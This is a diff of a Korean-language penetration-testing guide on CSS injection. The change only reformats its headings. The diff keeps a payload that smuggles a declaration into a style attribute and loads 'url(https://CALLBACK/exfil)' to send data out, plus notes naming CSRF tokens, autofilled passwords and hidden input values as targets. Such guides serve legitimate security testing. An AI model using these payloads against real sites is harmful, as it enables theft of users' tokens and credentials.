@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **인라인 style — declaration 추가:**
 - `red;background:url(https://CALLBACK/exfil)` (style 속성 sink)
@@ -75,7 +73,7 @@ const { chromium } = require('playwright');
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -96,7 +94,7 @@ const { chromium } = require('playwright');
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - CSS data exfiltration은 외부 fetch 받을 OAST 인프라 필수 — 콜백 없이는 검증 어려움
 - CSRF 토큰, password manager 자동입력 필드, hidden input value 추출이 가장 흔한 시나리오
